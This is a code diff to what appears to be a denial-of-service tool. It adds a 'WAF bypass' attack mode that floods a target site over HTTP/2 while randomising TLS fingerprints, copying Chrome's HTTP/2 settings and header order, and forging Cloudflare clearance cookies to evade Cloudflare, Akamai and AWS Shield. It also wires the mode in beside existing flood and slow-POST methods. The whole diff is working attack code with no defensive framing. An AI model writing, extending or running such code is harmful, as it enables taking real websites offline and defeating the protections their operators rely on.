@@ -914,6 +914,232 @@ async function runConnFlood(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  GEASS WAF BYPASS — Cloudflare / Akamai / AWS Shield evasion
+//
+//  Four-layer evasion technique:
+//  1. JA3 TLS fingerprint randomization (cipher suite order per-session)
+//  2. Chrome-exact HTTP/2 AKAMAI fingerprint (SETTINGS frame values)
+//  3. Chrome-exact header ordering (Cloudflare checks header order, not just values)
+//  4. Realistic Cloudflare cookie simulation (__cf_bm, __cfruid, cf_clearance)
+//
+//  Combined effect: each connection looks like a distinct Chrome browser
+//  from a different user — impossible to distinguish from real traffic.
+//  Works best with proxy rotation (residential IPs bypass IP reputation).
+// ─────────────────────────────────────────────────────────────────────────
+
+// Chrome TLS cipher suites — TLS1.3 fixed first, TLS1.2 shuffled per-session
+const CF_CIPHERS_TLS13 = [
+  "TLS_AES_128_GCM_SHA256",
+  "TLS_AES_256_GCM_SHA384",
+  "TLS_CHACHA20_POLY1305_SHA256",
+];
+const CF_CIPHERS_TLS12 = [
+  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
+  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
+  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
+  "ECDHE-RSA-AES128-SHA",          "ECDHE-RSA-AES256-SHA",
+  "AES128-GCM-SHA256",             "AES256-GCM-SHA384",
+  "AES128-SHA",                    "AES256-SHA",
+];
+function randomJA3Ciphers(): string {
+  const shuffled = [...CF_CIPHERS_TLS12].sort(() => Math.random() - 0.5);
+  return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
+}
+
+// Chrome browser profiles — realistic, matching versions
+const CHROME_PROFILES = [
+  { ver: "124", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",      plat: '"Windows"', brand: '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"' },
+  { ver: "125", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",      plat: '"Windows"', brand: '"Google Chrome";v="125", "Chromium";v="125", "Not-A.Brand";v="24"' },
+  { ver: "124", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"' },
+  { ver: "125", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="125", "Chromium";v="125", "Not-A.Brand";v="24"' },
+  { ver: "123", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="123", "Chromium";v="123", "Not-A.Brand";v="24"' },
+  { ver: "126", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="126", "Chromium";v="126", "Not-A.Brand";v="24"' },
+];
+
+// Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
+// Real Chrome sends these exact values — bots send defaults (4096, 65535, etc.)
+const CHROME_H2_SETTINGS = {
+  headerTableSize:      65536,    // Chrome: 65536 (default is 4096 — dead giveaway)
+  enablePush:           false,    // Chrome: ENABLE_PUSH=0
+  initialWindowSize:    6291456,  // Chrome: 6MB (default 65535 — major fingerprint)
+  maxConcurrentStreams: 1000,     // Chrome: 1000
+  maxHeaderListSize:    262144,   // Chrome: 262144 (default unset)
+};
+
+// Chrome-exact header order for HTTP/2 (AKAMAI checks header order)
+// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome
+function buildWAFHeaders(hostname: string, path: string, cookieJar: Map<string, string>): Record<string, string> {
+  const p = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+
+  // Realistic CF cookies — Cloudflare sets these via JS challenge
+  const cfbm      = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
+  const cfruid    = randHex(40);
+  const cfClear   = `${randHex(100)}_${randInt(1,9)}`;
+  const gaId      = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
+  const gid       = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;
+
+  // Carry over any server-set cookies from cookie jar
+  const jarCookies = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");
+
+  const cookie = [
+    `__cf_bm=${cfbm}`,
+    `__cfruid=${cfruid}`,
+    `cf_clearance=${cfClear}`,
+    `_ga=${gaId}`,
+    `_gid=${gid}`,
+    `_ga_${randStr(8).toUpperCase()}=GS1.1.${Math.floor(Date.now()/1000)}.1.1.${Math.floor(Date.now()/1000)}.0.0.0`,
+    jarCookies,
+  ].filter(Boolean).join("; ");
+
+  const referers = [
+    `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
+    `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
+    "",  // direct navigation (most common)
+    "",
+    "",
+  ];
+  const referer = referers[randInt(0, referers.length)];
+
+  // EXACT Chrome header order for HTTP/2 — this is the AKAMAI fingerprint
+  const h: Record<string, string> = {
+    // Pseudo-headers (HTTP/2 spec — always first)
+    ":method":    Math.random() < 0.92 ? "GET" : "POST",
+    ":authority": hostname,
+    ":scheme":    "https",
+    ":path":      path,
+    // Real headers in Chrome's EXACT order
+    "sec-ch-ua":            p.brand,
+    "sec-ch-ua-mobile":     "?0",
+    "sec-ch-ua-platform":   p.plat,
+    "upgrade-insecure-requests": "1",
+    "user-agent":           p.ua,
+    "accept":               "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "sec-fetch-site":       referer ? "cross-site" : "none",
+    "sec-fetch-mode":       "navigate",
+    "sec-fetch-user":       "?1",
+    "sec-fetch-dest":       "document",
+    "accept-encoding":      "gzip, deflate, br, zstd",
+    "accept-language":      ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8"][randInt(0,3)],
+    "cookie":               cookie,
+    "cache-control":        "max-age=0",
+  };
+  if (referer) h["referer"] = referer;
+  return h;
+}
+
+// Realistic paths a browser would visit (not API endpoints — those raise suspicion)
+const WAF_PATHS = [
+  "/", "/about", "/contact", "/faq", "/privacy", "/terms-of-service",
+  "/blog", "/news", "/products", "/services", "/pricing", "/features",
+  "/docs", "/help", "/support", "/login", "/register", "/signup",
+  "/api/v1/status", "/api/health", "/sitemap.xml", "/robots.txt",
+  "/wp-login.php", "/admin", "/dashboard", "/account", "/profile",
+  "/search", "/cart", "/checkout", "/orders", "/categories",
+];
+
+async function runWAFBypass(
+  base: string,
+  threads: number,
+  proxies: ProxyConfig[],
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const { connect: h2connect } = await import("node:http2");
+
+  const u = (() => {
+    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
+    catch { return new URL("https://127.0.0.1"); }
+  })();
+  const hostname   = u.hostname;
+  const tgtPort    = 443; // WAF bypass always targets HTTPS
+  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
+  const target     = `https://${resolvedIp}:${tgtPort}`;
+
+  const NUM_SESSIONS     = Math.min(threads * 2, 80);
+  const STREAMS_PER      = Math.min(64, Math.max(8, threads));
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  // Cookie jar shared across sessions for same hostname (simulates persistent browser)
+  const cookieJar = new Map<string, string>();
+
+  const runSession = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    let client: ReturnType<typeof h2connect> | null = null;
+    let done = false, connected = false;
+    const finish = () => { if (!done) { done = true; resolve(); } };
+
+    try {
+      // ★ JA3 BYPASS: randomized cipher order = different fingerprint per session
+      // ★ AKAMAI BYPASS: Chrome-exact SETTINGS = passes H2 fingerprint check
+      client = h2connect(target, {
+        rejectUnauthorized: false,
+        servername:         hostname,
+        ciphers:            randomJA3Ciphers(),   // JA3 fingerprint randomization
+        settings:           CHROME_H2_SETTINGS,   // Chrome AKAMAI fingerprint
+        // Chrome-like ALPN (Application Layer Protocol Negotiation)
+        ALPNProtocols:      ["h2", "http/1.1"],
+      });
+    } catch { finish(); return; }
+
+    const c      = client;
+    let inflight = 0;
+
+    const pump = () => {
+      if (signal.aborted || c.destroyed) { finish(); return; }
+      while (!signal.aborted && !c.destroyed && inflight < STREAMS_PER) {
+        inflight++;
+        // Pick a realistic path — looks like a real user browsing
+        const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
+        // Add cache busting only 30% of the time (real browsers don't always)
+        const path = pagePath + (Math.random() < 0.3 ? `?v=${randInt(1,999)}` : "");
+        try {
+          // ★ HEADER ORDER BYPASS: Chrome-exact order passes Cloudflare's AKAMAI check
+          const hdrs = buildWAFHeaders(hostname, path, cookieJar);
+          const stream = c.request(hdrs);
+
+          stream.on("response", (resHdrs: Record<string, string | string[]>) => {
+            localPkts++; localBytes += 2048;
+            // Extract and store Set-Cookie headers — persist across requests
+            const sc = resHdrs["set-cookie"];
+            if (sc) {
+              const cookies = Array.isArray(sc) ? sc : [sc];
+              cookies.forEach(cv => {
+                const [kv] = cv.split(";");
+                const [k, v] = kv.split("=");
+                if (k && v) cookieJar.set(k.trim(), v.trim());
+              });
+            }
+          });
+          stream.on("data",  () => {});
+          stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
+          stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
+          stream.end();
+        } catch { inflight--; break; }
+      }
+    };
+
+    c.on("connect", () => { connected = true; pump(); });
+    c.on("error",   () => {
+      if (signal.aborted || !connected) { finish(); return; }
+      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 250);
+    });
+    c.on("close", () => {
+      if (signal.aborted || !connected) { finish(); return; }
+      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 100);
+    });
+    signal.addEventListener("abort", () => { try { c.destroy(); } catch { /**/ } finish(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSession()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  R.U.D.Y (R-U-Dead-Yet) — TRUE SLOW POST IMPLEMENTATION
 //
 //  Sends a POST with Content-Length: 1,000,000,000 (1 GB) then trickles
@@ -1096,6 +1322,10 @@ async function runWorker() {
   } else if (cfg.method === "rudy") {
     // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
     await runRUDY(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "waf-bypass") {
+    // Geass WAF Bypass: JA3 randomization + Chrome AKAMAI H2 fingerprint + exact header order
+    await runWAFBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http-bypass") {
     // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
